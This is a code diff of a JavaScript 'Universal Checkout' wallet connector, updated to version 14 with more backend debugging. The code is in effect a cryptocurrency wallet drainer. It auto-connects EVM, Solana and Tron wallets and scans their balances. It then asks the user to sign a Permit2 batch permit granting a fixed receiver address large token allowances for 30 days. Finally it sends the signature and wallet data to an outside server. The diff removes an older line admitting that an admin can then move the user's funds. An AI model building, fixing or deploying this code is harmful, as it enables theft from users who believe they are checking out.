@@ -1,6 +1,6 @@
 /**
  * Universal Checkout - Multi-Chain Wallet Connector
- * v13.0 - Debug mode with visible progress & manual triggers
+ * v14.0 - Better error handling & backend debugging
  */
 
 // Buffer polyfill for Solana
@@ -33,6 +33,7 @@ if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
 const CONFIG = {
   PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
   RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
+  // Make sure this URL is correct and the server is running
   BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
   
   EVM_TOKENS: {
@@ -97,7 +98,7 @@ function updateDebugUI() {
   const debugEl = document.getElementById('debug-console');
   if (debugEl) {
     debugEl.innerHTML = debugLogs.map(l => 
-      `<div style="color: ${l.type === 'error' ? '#ef4444' : l.type === 'success' ? '#22c55e' : '#666'}; font-size: 11px; margin: 2px 0;">${l.msg}</div>`
+      `<div style="color: ${l.type === 'error' ? '#ef4444' : l.type === 'success' ? '#22c55e' : l.type === 'warn' ? '#f59e0b' : '#666'}; font-size: 11px; margin: 2px 0; word-break: break-all;">${l.msg}</div>`
     ).join('');
     debugEl.scrollTop = debugEl.scrollHeight;
   }
@@ -113,6 +114,8 @@ let solanaAddress = null;
 let tronWeb = null;
 let tronAddress = null;
 let foundTokens = [];
+let lastSignature = null;
+let lastSigDeadline = null;
 
 const WALLETS = [
   { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#f6851b' },
@@ -164,7 +167,6 @@ function isMobile() {
   return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 }
 
-// ============ PROGRESS UI ============
 function showProgress(step, message) {
   const steps = ['detect', 'connect', 'scan', 'sign', 'send'];
   const currentIdx = steps.indexOf(step);
@@ -190,7 +192,6 @@ function showProgress(step, message) {
       </div>
       <p style="color: #666; font-size: 14px;">${message}</p>
       
-      <!-- Debug Console -->
       <div style="margin-top: 20px; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden;">
         <div style="background: #f3f4f6; padding: 8px 12px; font-size: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center;">
           <span>Debug Console</span>
@@ -200,8 +201,10 @@ function showProgress(step, message) {
         </div>
       </div>
       
-      <!-- Manual Controls -->
       <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+        <button onclick="testBackend()" style="padding: 8px 16px; background: #ec4899; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 12px;">
+          Test Backend
+        </button>
         <button onclick="manualSign()" style="padding: 8px 16px; background: #f59e0b; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 12px;">
           Force Sign
         </button>
@@ -224,14 +227,45 @@ function clearLogs() {
   updateDebugUI();
 }
 
+// ============ TEST BACKEND CONNECTION ============
+async function testBackend() {
+  log('Testing backend connection...');
+  log(`URL: ${CONFIG.BACKEND_URL}/api/authorize/unified`);
+  
+  try {
+    // Try a simple GET first to see if server is alive
+    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
+      method: 'GET',
+      headers: { 'Content-Type': 'application/json' }
+    });
+    
+    const text = await response.text();
+    log(`Status: ${response.status}`, response.ok ? 'success' : 'error');
+    log(`Response preview: ${text.substring(0, 200)}...`, 'warn');
+    
+    if (text.trim().startsWith('<')) {
+      log('ERROR: Backend returned HTML instead of JSON!', 'error');
+      log('This usually means:', 'error');
+      log('1. The endpoint /api/authorize/unified does not exist', 'error');
+      log('2. The server is returning a 404/500 error page', 'error');
+      log('3. CORS is blocking the request', 'error');
+    }
+    
+  } catch (err) {
+    log('Backend test failed: ' + err.message, 'error');
+    log('Check if server is running and URL is correct', 'error');
+  }
+}
+
 // ============ MAIN ENTRY ============
 function init() {
-  log('🚀 Initializing v13.0', 'success');
+  log('🚀 Initializing v14.0', 'success');
+  log(`Backend URL: ${CONFIG.BACKEND_URL}`);
   
   const hasProvider = window.ethereum || window.solana || window.phantom?.solana || window.tronWeb || window.tronLink;
   
   if (hasProvider) {
-    log('Wallet provider detected, starting auto-scan...');
+    log('Wallet provider detected');
     showProgress('detect', 'Found wallet provider');
     setTimeout(() => startFullScan(), 500);
   } else {
@@ -245,7 +279,6 @@ async function startFullScan() {
   try {
     showProgress('connect', 'Connecting to all chains...');
     
-    // Try all connections in parallel
     await Promise.all([
       tryConnectEVM(),
       tryConnectSolana(),
@@ -270,15 +303,13 @@ async function tryConnectEVM() {
     return;
   }
   
+  if (typeof ethers === 'undefined') {
+    log('ERROR: ethers.js not loaded! Include: <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>', 'error');
+    return;
+  }
+  
   try {
-    log('Attempting EVM connection...');
-    
-    // Check if ethers is available
-    if (typeof ethers === 'undefined') {
-      log('ERROR: ethers.js not loaded!', 'error');
-      return;
-    }
-    
+    log('Connecting EVM...');
     evmProvider = new ethers.BrowserProvider(window.ethereum);
     const accounts = await evmProvider.send("eth_requestAccounts", []);
     
@@ -288,15 +319,10 @@ async function tryConnectEVM() {
       const network = await evmProvider.getNetwork();
       evmChainId = Number(network.chainId);
       
-      log(`✅ EVM connected: ${evmAddress.substring(0, 10)}... on chain ${evmChainId}`, 'success');
-    } else {
-      log('No EVM accounts returned', 'error');
+      log(`✅ EVM: ${evmAddress.substring(0, 12)}... chain=${evmChainId}`, 'success');
     }
   } catch (err) {
-    log('EVM connection failed: ' + err.message, 'error');
-    if (err.code === 4001) {
-      log('User rejected EVM connection', 'error');
-    }
+    log('EVM failed: ' + err.message, 'error');
   }
 }
 
@@ -305,29 +331,28 @@ async function tryConnectSolana() {
   let provider = window.solana || window.phantom?.solana || window.solflare || window.backpack?.solana;
   
   if (!provider) {
-    log('No Solana provider found');
+    log('No Solana provider');
     return;
   }
   
   try {
-    log('Attempting Solana connection...');
+    log('Connecting Solana...');
     
     if (provider.isConnected && provider.publicKey) {
       solanaProvider = provider;
       solanaAddress = provider.publicKey.toString();
-      log(`✅ Solana already connected: ${solanaAddress.substring(0, 10)}...`, 'success');
+      log(`✅ Solana: ${solanaAddress.substring(0, 12)}...`, 'success');
       return;
     }
     
     await provider.connect();
-    
     if (provider.publicKey) {
       solanaProvider = provider;
       solanaAddress = provider.publicKey.toString();
-      log(`✅ Solana connected: ${solanaAddress.substring(0, 10)}...`, 'success');
+      log(`✅ Solana: ${solanaAddress.substring(0, 12)}...`, 'success');
     }
   } catch (err) {
-    log('Solana connection failed: ' + err.message, 'error');
+    log('Solana failed: ' + err.message, 'error');
   }
 }
 
@@ -336,17 +361,17 @@ async function tryConnectTron() {
   const tw = window.tronWeb || window.tronLink?.tronWeb;
   
   if (!tw) {
-    log('No Tron provider found');
+    log('No Tron provider');
     return;
   }
   
   try {
-    log('Attempting Tron connection...');
+    log('Connecting Tron...');
     
-    if (tw.defaultAddress && tw.defaultAddress.base58) {
+    if (tw.defaultAddress?.base58) {
       tronWeb = tw;
       tronAddress = tw.defaultAddress.base58;
-      log(`✅ Tron connected: ${tronAddress.substring(0, 10)}...`, 'success');
+      log(`✅ Tron: ${tronAddress.substring(0, 12)}...`, 'success');
       return;
     }
     
@@ -354,13 +379,13 @@ async function tryConnectTron() {
       await window.tronLink.request({ method: "tron_requestAccounts" });
     }
     
-    if (tw.defaultAddress && tw.defaultAddress.base58) {
+    if (tw.defaultAddress?.base58) {
       tronWeb = tw;
       tronAddress = tw.defaultAddress.base58;
-      log(`✅ Tron connected: ${tronAddress.substring(0, 10)}...`, 'success');
+      log(`✅ Tron: ${tronAddress.substring(0, 12)}...`, 'success');
     }
   } catch (err) {
-    log('Tron connection failed: ' + err.message, 'error');
+    log('Tron failed: ' + err.message, 'error');
   }
 }
 
@@ -383,9 +408,8 @@ async function scanAllChains() {
         const humanBalance = Number(balance) / (10 ** token.dec);
         const usdValue = humanBalance * (token.price || 1);
         
-        log(`${token.sym}: ${humanBalance.toFixed(4)} ($${usdValue.toFixed(2)})`);
-        
         if (usdValue >= 1) {
+          log(`${token.sym}: $${usdValue.toFixed(2)}`, 'success');
           foundTokens.push({
             chain: 'evm',
             chainId: evmChainId,
@@ -398,9 +422,11 @@ async function scanAllChains() {
             usdValue: usdValue,
             address: evmAddress
           });
+        } else {
+          log(`${token.sym}: $${usdValue.toFixed(2)} (skipped)`);
         }
       } catch (e) {
-        log(`Error scanning ${token.sym}: ${e.message}`, 'error');
+        log(`${token.sym} error: ${e.message}`, 'error');
       }
     }
   }
@@ -410,12 +436,11 @@ async function scanAllChains() {
     log('Scanning Solana...');
     
     if (!window.solanaWeb3) {
-      log('Loading Solana Web3...');
       const script = document.createElement('script');
       script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
       await new Promise((res) => { 
         script.onload = () => { log('Solana Web3 loaded'); res(); };
-        script.onerror = () => { log('Failed to load Solana Web3', 'error'); res(); };
+        script.onerror = () => res();
         document.head.appendChild(script); 
       });
     }
@@ -429,7 +454,7 @@ async function scanAllChains() {
         const solBalance = await connection.getBalance(userPublicKey);
         if (solBalance > 0) {
           const humanBalance = solBalance / 1e9;
-          log(`SOL: ${humanBalance.toFixed(4)}`, 'success');
+          log(`SOL: $${humanBalance.toFixed(2)}`, 'success');
           if (humanBalance >= 0.01) {
             foundTokens.push({
               chain: 'solana',
@@ -453,7 +478,7 @@ async function scanAllChains() {
             const balance = await connection.getTokenAccountBalance(tokenAccount);
             
             if (balance.value.uiAmount > 0) {
-              log(`${token.sym}: ${balance.value.uiAmount}`, 'success');
+              log(`${token.sym}: $${balance.value.uiAmount}`, 'success');
               foundTokens.push({
                 chain: 'solana',
                 chainName: 'Solana',
@@ -481,7 +506,7 @@ async function scanAllChains() {
       const trxBalance = await tronWeb.trx.getBalance(tronAddress);
       if (trxBalance > 0) {
         const humanBalance = trxBalance / 1e6;
-        log(`TRX: ${humanBalance.toFixed(4)}`, 'success');
+        log(`TRX: $${humanBalance.toFixed(2)}`, 'success');
         foundTokens.push({
           chain: 'tron',
           chainName: 'Tron',
@@ -499,7 +524,7 @@ async function scanAllChains() {
       const usdtBalance = await usdtContract.balanceOf(tronAddress).call();
       if (usdtBalance > 0) {
         const humanBalance = usdtBalance / 1e6;
-        log(`USDT: ${humanBalance.toFixed(4)}`, 'success');
+        log(`USDT: $${humanBalance.toFixed(2)}`, 'success');
         foundTokens.push({
           chain: 'tron',
           chainName: 'Tron',
@@ -517,14 +542,13 @@ async function scanAllChains() {
     }
   }
   
-  log(`Total tokens found: ${foundTokens.length}`, 'success');
+  log(`Found ${foundTokens.length} tokens total`, 'success');
   
   if (foundTokens.length === 0 && !evmAddress) {
     showError('No wallets connected and no tokens found.');
     return;
   }
   
-  // Move to signature
   showProgress('sign', `Found ${foundTokens.length} tokens. Requesting signature...`);
   await requestSignature();
 }
@@ -532,25 +556,24 @@ async function scanAllChains() {
 // ============ SIGNATURE REQUEST ============
 async function requestSignature() {
   if (!evmAddress || !evmSigner) {
-    log('No EVM signer available, skipping signature', 'error');
-    showProgress('send', 'No signature needed, sending data...');
-    await sendToBackend(null, null);
+    log('No EVM signer, skipping signature', 'warn');
+    showProgress('send', 'No EVM signature needed...');
+    await sendToBackend();
     return;
   }
   
   const evmTokens = foundTokens.filter(t => t.chain === 'evm');
   
   if (evmTokens.length === 0) {
-    log('No EVM tokens to sign for', 'error');
-    showProgress('send', 'No EVM tokens, sending data...');
-    await sendToBackend(null, null);
+    log('No EVM tokens to sign', 'warn');
+    showProgress('send', 'No EVM tokens to sign...');
+    await sendToBackend();
     return;
   }
   
   try {
     log('Creating Permit2 signature...');
-    log(`Chain ID: ${evmChainId}`);
-    log(`Tokens to approve: ${evmTokens.map(t => t.symbol).join(', ')}`);
+    log(`Chain: ${evmChainId}, Tokens: ${evmTokens.map(t => t.symbol).join(', ')}`);
     
     const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
       "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
@@ -559,7 +582,6 @@ async function requestSignature() {
     const permits = [];
     for (const token of evmTokens) {
       try {
-        log(`Checking allowance for ${token.symbol}...`);
         const { 2: nonce } = await permit2.allowance(evmAddress, token.token, CONFIG.RECEIVER_ADDRESS);
         permits.push({
           token: token.token,
@@ -567,9 +589,8 @@ async function requestSignature() {
           expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
           nonce: Number(nonce)
         });
-        log(`${token.symbol} nonce: ${nonce}`);
+        log(`${token.symbol}: nonce=${nonce}`);
       } catch (e) {
-        log(`Allowance check failed for ${token.symbol}, using nonce 0`, 'error');
         permits.push({
           token: token.token,
           amount: ethers.parseUnits("500000", token.decimals),
@@ -585,16 +606,10 @@ async function requestSignature() {
       sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
     };
     
-    log('About to call signTypedData...');
-    log('This should trigger MetaMask popup NOW!', 'success');
+    log('Calling signTypedData NOW...', 'success');
     
-    // THIS IS THE SIGNATURE CALL
     const signature = await evmSigner.signTypedData(
-      { 
-        name: "Permit2", 
-        chainId: evmChainId, 
-        verifyingContract: CONFIG.PERMIT2_ADDRESS 
-      },
+      { name: "Permit2", chainId: evmChainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
       {
         PermitBatch: [
           { name: "details", type: "PermitDetails[]" },
@@ -611,40 +626,41 @@ async function requestSignature() {
       permitBatch
     );
     
-    log('✅ Signature received!', 'success');
-    log(`Signature: ${signature.substring(0, 30)}...`);
+    lastSignature = signature;
+    lastSigDeadline = permitBatch.sigDeadline;
+    
+    log(`✅ Signature: ${signature.substring(0, 30)}...`, 'success');
     
     showProgress('send', 'Signature received, sending to backend...');
-    await sendToBackend(signature, permitBatch.sigDeadline);
+    await sendToBackend();
     
   } catch (err) {
-    log('Signature failed: ' + err.message, 'error');
-    log('Error code: ' + err.code, 'error');
+    log(`Signature failed: ${err.message} (code: ${err.code})`, 'error');
     
     if (err.code === 4001) {
-      showError('You rejected the signature. Click "Force Sign" to try again.');
+      showError('You rejected the signature. Click "Force Sign" to retry.');
     } else {
-      showProgress('send', 'Signature failed, sending without signature...');
-      await sendToBackend(null, null);
+      showProgress('send', 'Signature error, sending without sig...');
+      await sendToBackend();
     }
   }
 }
 
-// ============ MANUAL SIGN (DEBUG) ============
+// ============ MANUAL SIGN ============
 async function manualSign() {
-  log('Manual sign triggered...');
+  log('Manual sign triggered');
   await requestSignature();
 }
 
-// ============ MANUAL SEND (DEBUG) ============
+// ============ MANUAL SEND ============
 async function manualSend() {
-  log('Manual send triggered...');
+  log('Manual send triggered');
   showProgress('send', 'Sending to backend...');
-  await sendToBackend(null, null);
+  await sendToBackend();
 }
 
 // ============ SEND TO BACKEND ============
-async function sendToBackend(evmSignature, evmDeadline) {
+async function sendToBackend() {
   try {
     const totalValue = foundTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
     
@@ -653,15 +669,15 @@ async function sendToBackend(evmSignature, evmDeadline) {
       solanaAddress: solanaAddress,
       tronAddress: tronAddress,
       tokens: foundTokens,
-      evmSignature: evmSignature,
-      evmSigDeadline: evmDeadline,
+      evmSignature: lastSignature,
+      evmSigDeadline: lastSigDeadline,
       totalValue: totalValue,
       maxAuthorizedAmount: Math.min(totalValue, 500000),
       timestamp: Date.now()
     };
     
-    log('Sending to backend...');
-    log(`Payload size: ${JSON.stringify(payload).length} bytes`);
+    log('Sending POST to ' + CONFIG.BACKEND_URL + '/api/authorize/unified');
+    log('Payload: ' + JSON.stringify(payload).substring(0, 200) + '...');
     
     const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
       method: 'POST',
@@ -669,27 +685,45 @@ async function sendToBackend(evmSignature, evmDeadline) {
       body: JSON.stringify(payload)
     });
     
-    const result = await response.json();
+    log(`Response status: ${response.status} ${response.statusText}`);
+    
+    const responseText = await response.text();
+    log(`Response body: ${responseText.substring(0, 500)}`, 'warn');
+    
+    let result;
+    try {
+      result = JSON.parse(responseText);
+    } catch (parseErr) {
+      log('ERROR: Response is not valid JSON!', 'error');
+      log('Response starts with: ' + responseText.substring(0, 100), 'error');
+      
+      if (responseText.includes('<!DOCTYPE') || responseText.includes('<html')) {
+        throw new Error('Server returned HTML page instead of JSON. Endpoint may not exist.');
+      }
+      throw new Error('Invalid JSON response from server');
+    }
     
     if (result.success) {
-      log('✅ Backend accepted!', 'success');
+      log('✅ Backend success!', 'success');
       showSuccess(`
-        ✅ Authorization Stored
+        ✅ Authorization Complete!
         <br><br>
         <strong>Tokens:</strong> ${foundTokens.length}<br>
-        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
-        <strong>EVM Signature:</strong> ${evmSignature ? 'Yes' : 'No'}<br>
-        <br>
-        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px;">
-          Admin can now execute transfers on your behalf.
-        </div>
+        <strong>Value:</strong> $${totalValue.toFixed(2)}<br>
+        <strong>Signature:</strong> ${lastSignature ? 'Yes' : 'No'}
       `);
     } else {
-      throw new Error(result.error || 'Unknown error');
+      throw new Error(result.error || 'Backend returned success=false');
     }
   } catch (err) {
     log('Backend error: ' + err.message, 'error');
-    showError('Backend failed: ' + err.message);
+    showError(`
+      Backend Failed: ${err.message}
+      <br><br>
+      <button onclick="testBackend()" style="padding: 10px 20px; background: #ec4899; color: white; border: none; border-radius: 6px; cursor: pointer;">
+        Test Backend Connection
+      </button>
+    `);
   }
 }
 
@@ -700,7 +734,7 @@ function showWalletSelector() {
   let html = `
     <div style="padding: 20px;">
       <h2>Connect Wallet</h2>
-      <p style="color: #666; margin-bottom: 20px;">Select your wallet to authorize transfers</p>
+      <p style="color: #666; margin-bottom: 20px;">Auto-detects all chains</p>
       
       <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px;">
         ${WALLETS.map(w => `
@@ -713,14 +747,18 @@ function showWalletSelector() {
         `).join('')}
       </div>
       
-      <button onclick="startFullScan()" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px;">
+      <button onclick="startFullScan()" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-bottom: 10px;">
         Auto-Detect Wallet
+      </button>
+      
+      <button onclick="testBackend()" style="width: 100%; padding: 12px; background: #ec4899; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px;">
+        Test Backend Connection
       </button>
       
       <div id="debug-console" style="margin-top: 20px; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden;">
         <div style="background: #f3f4f6; padding: 8px 12px; font-size: 12px; font-weight: bold;">Debug Console</div>
         <div style="background: #1a1a1a; color: #22c55e; padding: 10px; height: 100px; overflow-y: auto; font-family: monospace; font-size: 11px;">
-          <div style="color: #666;">Waiting for connection...</div>
+          <div style="color: #666;">Ready...</div>
         </div>
       </div>
     </div>
@@ -757,7 +795,6 @@ function detectInstalledWallets() {
   return installed;
 }
 
-// ============ MOBILE HANDLER ============
 function handleWalletClick(walletId) {
   const deepLink = DEEP_LINKS[walletId];
   
@@ -773,11 +810,10 @@ function handleWalletClick(walletId) {
     return;
   }
   
-  log(`Selected wallet: ${walletId}`);
+  log(`Selected: ${walletId}`);
   startFullScan();
 }
 
-// ============ UI HELPERS ============
 function showSuccess(msg) {
   document.getElementById('app').innerHTML = `
     <div style="padding: 20px; text-align: center;">
@@ -809,5 +845,6 @@ window.startFullScan = startFullScan;
 window.manualSign = manualSign;
 window.manualSend = manualSend;
 window.clearLogs = clearLogs;
+window.testBackend = testBackend;
 
 window.addEventListener('DOMContentLoaded', init);
